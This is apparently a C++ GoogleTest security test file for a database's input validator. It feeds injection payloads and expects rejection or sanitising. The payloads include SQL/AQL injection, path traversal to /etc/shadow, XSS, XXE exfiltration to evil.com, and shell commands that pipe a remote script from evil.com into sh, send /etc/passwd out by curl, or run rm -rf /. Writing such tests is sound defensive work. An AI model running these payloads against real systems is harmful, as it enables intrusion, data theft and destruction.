#include <gtest/gtest.h>
#include "utils/input_validator.h"
#include <string>
#include <vector>

using namespace themis::utils;

/**
 * @brief Security tests for input validation
 * 
 * These tests validate protection against:
 * - SQL/AQL injection
 * - Path traversal
 * - XSS attacks
 * - Command injection
 * - XXE attacks
 */
class InputValidationSecurityTest : public ::testing::Test {
protected:
    void SetUp() override {
        validator_ = std::make_unique<InputValidator>();
    }
    
    std::unique_ptr<InputValidator> validator_;
};

// existing tests...


/**
 * @brief Test: AQL injection prevention
 */
TEST_F(InputValidationSecurityTest, AQLInjection_MaliciousQueries) {
    std::vector<std::string> malicious_queries = {
        "FOR u IN users FILTER u.name == 'admin' OR '1'='1' RETURN u",
        "'; DROP COLLECTION users; //",
        "admin' OR 1=1--",
        "' UNION SELECT * FROM sensitive_data--",
        "'; REMOVE u IN users; //"
    };
    
    for (const auto& query : malicious_queries) {
        // Validator should detect injection attempts
        bool is_safe = validator_->validateAQLQuery(query);
        EXPECT_FALSE(is_safe) 
            << "Malicious AQL query should be rejected: " << query;
    }
}

/**
 * @brief Test: Path traversal prevention
 */
TEST_F(InputValidationSecurityTest, PathTraversal_AttackPatterns) {
    std::vector<std::string> malicious_paths = {
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2f",  // URL encoded
        "..%252f..%252f..%252fetc/passwd",  // Double URL encoded
        "/../../../../../../etc/shadow",
        "file:///etc/passwd",
        "/proc/self/environ"
    };
    
    for (const auto& path : malicious_paths) {
        bool is_safe = validator_->validateFilePath(path);
        EXPECT_FALSE(is_safe) 
            << "Path traversal attempt should be rejected: " << path;
    }
}

/**
 * @brief Test: XSS prevention in user input
 */
TEST_F(InputValidationSecurityTest, XSS_ScriptInjection) {
    std::vector<std::string> xss_payloads = {
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=javascript:alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'-alert('XSS')-'",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
        "<body onload=alert('XSS')>"
    };
    
    for (const auto& payload : xss_payloads) {
        std::string sanitized = validator_->sanitizeForHTML(payload);
        
        // Sanitized output should not contain script tags or event handlers
        EXPECT_TRUE(sanitized.find("<script") == std::string::npos) 
            << "Script tags should be removed/escaped";
        EXPECT_TRUE(sanitized.find("javascript:") == std::string::npos)
            << "Javascript protocol should be removed";
        EXPECT_TRUE(sanitized.find("onerror") == std::string::npos)
            << "Event handlers should be removed";
    }
}

/**
 * @brief Test: Command injection prevention
 */
TEST_F(InputValidationSecurityTest, CommandInjection_ShellCommands) {
    std::vector<std::string> command_injections = {
        "file.txt; rm -rf /",
        "| cat /etc/passwd",
        "& net user attacker password /add",
        "`whoami`",
        "$(cat /etc/shadow)",
        "&& wget http://evil.com/backdoor.sh | sh",
        "; curl http://evil.com?data=$(cat /etc/passwd)"
    };
    
    for (const auto& cmd : command_injections) {
        bool is_safe = validator_->validateFilename(cmd);
        EXPECT_FALSE(is_safe) 
            << "Command injection should be rejected: " << cmd;
    }
}

/**
 * @brief Test: NoSQL injection prevention
 */
TEST_F(InputValidationSecurityTest, NoSQLInjection_MongoDBStyle) {
    // While ThemisDB uses AQL, test against common NoSQL injection patterns
    std::vector<std::string> nosql_injections = {
        "{'$gt': ''}",
        "{'$ne': null}",
        "'; return true; var dummy='",
        "admin' || 'a'=='a",
        "{'username': {'$regex': '.*'}}"
    };
    
    for (const auto& injection : nosql_injections) {
        bool is_safe = validator_->validateJSON(injection);
        // Should either reject or safely escape
        if (is_safe) {
            // If accepted, verify it's properly escaped
            EXPECT_TRUE(injection.find("$gt") == std::string::npos ||
                       injection.find("\\$gt") != std::string::npos)
                << "MongoDB operators should be escaped";
        }
    }
}

/**
 * @brief Test: XXE (XML External Entity) prevention
 */
TEST_F(InputValidationSecurityTest, XXE_ExternalEntityInjection) {
    std::vector<std::string> xxe_payloads = {
        R"(<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>)",
        R"(<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><root>&xxe;</root>)",
        R"(<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/?x=%file;'>">%eval;%exfil;)"
    };
    
    for (const auto& payload : xxe_payloads) {
        bool is_safe = validator_->validateXML(payload);
        EXPECT_FALSE(is_safe) 
            << "XXE payload should be rejected: " << payload;
    }
}

/**
 * @brief Test: LDAP injection prevention
 */
TEST_F(InputValidationSecurityTest, LDAPInjection_FilterBypass) {
    std::vector<std::string> ldap_injections = {
        "*)(uid=*))(|(uid=*",
        "admin)(&(password=*))",
        "*)(|(objectClass=*",
        "*))(objectClass=*"
    };
    
    for (const auto& injection : ldap_injections) {
        bool is_safe = validator_->validateLDAPFilter(injection);
        EXPECT_FALSE(is_safe) 
            << "LDAP injection should be rejected: " << injection;
    }
}

/**
 * @brief Test: Email injection prevention
 */
TEST_F(InputValidationSecurityTest, EmailInjection_HeaderInjection) {
    std::vector<std::string> email_injections = {
        "test@example.com\nBcc: attacker@evil.com",
        "test@example.com\r\nCc: spam@evil.com",
        "test@example.com%0ABcc:attacker@evil.com",
        "test@example.com\nSubject: Spam\nBody: Evil content"
    };
    
    for (const auto& email : email_injections) {
        bool is_safe = validator_->validateEmail(email);
        EXPECT_FALSE(is_safe) 
            << "Email injection should be rejected: " << email;
    }
}

/**
 * @brief Test: URL injection prevention
 */
TEST_F(InputValidationSecurityTest, URLInjection_OpenRedirect) {
    std::vector<std::string> malicious_urls = {
        "javascript:alert('XSS')",
        "data:text/html,<script>alert('XSS')</script>",
        "//evil.com/redirect",
        "http://evil.com@good.com/",
        "http://good.com?redirect=http://evil.com",
        "file:///etc/passwd",
        "ftp://anonymous@evil.com/"
    };
    
    for (const auto& url : malicious_urls) {
        bool is_safe = validator_->validateURL(url, {"http", "https"});
        EXPECT_FALSE(is_safe) 
            << "Malicious URL should be rejected: " << url;
    }
}

/**
 * @brief Test: Buffer overflow prevention
 */
TEST_F(InputValidationSecurityTest, BufferOverflow_ExcessiveLength) {
    // Test with extremely long inputs
    std::string very_long_string(10000000, 'A');  // 10MB string
    
    bool is_safe = validator_->validateStringLength(very_long_string, 1024);
    EXPECT_FALSE(is_safe) << "Excessively long string should be rejected";
}

/**
 * @brief Test: Integer overflow prevention
 */
TEST_F(InputValidationSecurityTest, IntegerOverflow_BoundaryValues) {
    std::vector<int64_t> overflow_values = {
        INT64_MAX,
        INT64_MIN,
        -1,  // When unsigned expected
    };
    
    for (auto value : overflow_values) {
        bool is_safe = validator_->validateIntegerRange(value, 0, 1000);
        EXPECT_FALSE(is_safe) 
            << "Out of range integer should be rejected: " << value;
    }
}

/**
 * @brief Test: Format string injection prevention
 */
TEST_F(InputValidationSecurityTest, FormatStringInjection_SpecialCharacters) {
    std::vector<std::string> format_strings = {
        "%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x%x%x",
        "%n%n%n%n%n%n%n%n%n%n",
        "%08x.%08x.%08x.%08x"
    };
    
    for (const auto& fmt : format_strings) {
        std::string sanitized = validator_->sanitizeLogMessage(fmt);
        
        // Format specifiers should be escaped or removed
        EXPECT_TRUE(sanitized.find("%n") == std::string::npos)
            << "Dangerous format specifiers should be removed";
    }
}

/**
 * @brief Test: Unicode normalization attacks
 */
TEST_F(InputValidationSecurityTest, Unicode_NormalizationBypass) {
    std::vector<std::string> unicode_attacks = {
        "\xEF\xBC\x9Cscript\xEF\xBC\x9E",  // Full-width characters
        "\u003Cscript\u003E",               // Unicode escapes
        "\x3Cscript\x3E"                    // Hex escapes
    };
    
    for (const auto& attack : unicode_attacks) {
        std::string normalized = validator_->normalizeUnicode(attack);
        
        // After normalization, script tags should be detectable
        EXPECT_TRUE(normalized.find("<script") != std::string::npos ||
                   normalized.find("&lt;script") != std::string::npos)
            << "Unicode normalization should reveal hidden patterns";
    }
}

/**
 * @brief Test: CRLF injection prevention
 */
TEST_F(InputValidationSecurityTest, CRLFInjection_HTTPHeaderSplitting) {
    std::vector<std::string> crlf_injections = {
        "test\r\nSet-Cookie: admin=true",
        "value\nLocation: http://evil.com",
        "test%0d%0aSet-Cookie: hacked=true"
    };
    
    for (const auto& injection : crlf_injections) {
        bool is_safe = validator_->validateHeaderValue(injection);
        EXPECT_FALSE(is_safe) 
            << "CRLF injection should be rejected: " << injection;
    }
}
